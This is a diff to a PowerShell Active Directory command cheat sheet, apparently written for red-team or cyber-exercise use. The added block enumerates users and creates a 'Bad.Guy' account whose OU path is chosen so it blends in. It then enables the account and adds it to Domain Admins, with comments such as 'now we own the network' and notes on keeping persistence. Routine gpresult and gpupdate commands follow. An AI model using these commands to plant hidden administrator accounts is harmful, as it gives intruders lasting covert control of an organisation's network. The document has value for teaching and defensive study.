@@ -1279,6 +1279,36 @@ Set-AdAccountPassword -Identity <actname> -NewPassword (ConvertTo-SecureString -
 
 Add-ADGroupMember -Identity "<group name>" -Members <user>              #adds given user to the given group
 
+Get-ADuser -filter * | select distinguishedname, name                   #Gets the distinguised names for all users in the ad
+                                                                        #use this to get format to match to when making users
+
+New-ADUser -Name "Bad.Guy" -AccountPassword (ConvertTo-SecureString -AsPlaintext -String "PassWord12345!!" -Force) -path "OU=3RD PLT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=army,DC=warriors"
+                              #creates a new user matching the distinguised name/FQDN so it doesnt stand out
+Enable-ADAccount -Identity "Bad.Guy"                                    #enables the user from command above
+Add-ADGroupMember -Identity "Domain Admins" -Members "Bad.Guy"          #adds above user to admin group
+                                                                        #now we own the network
+
+Remove-ADUser -Identity "Bad.Guy"                                       #removes user from above (do if not wanting to maintain persistance)
+
+Get-AdGroupMember -identity "Domain Admins" -Recursive | %{Get-ADUser -identity $_.DistinguishedName}
+Get-AdGroupMember -identity "Domain Admins" -Recursive | %{Get-ADUser -identity $_.DistinguishedName} | select name, Enabled
+                              #gets all domain admin accounts (second just cleans up output a little
+                              #can swap domain admins for any group you want to find members of
+
+gpresult /user <user> /v                                               #returns computer and user node settings of a user
+
+gpresult /r                                                            #displays data about the machine and logged on user
+
+gpupdate /force                                                         #force any group policy setting to take affect immediately versus rebooting the computer
+
+
+
+
+
+
+
+
+
 
 
 
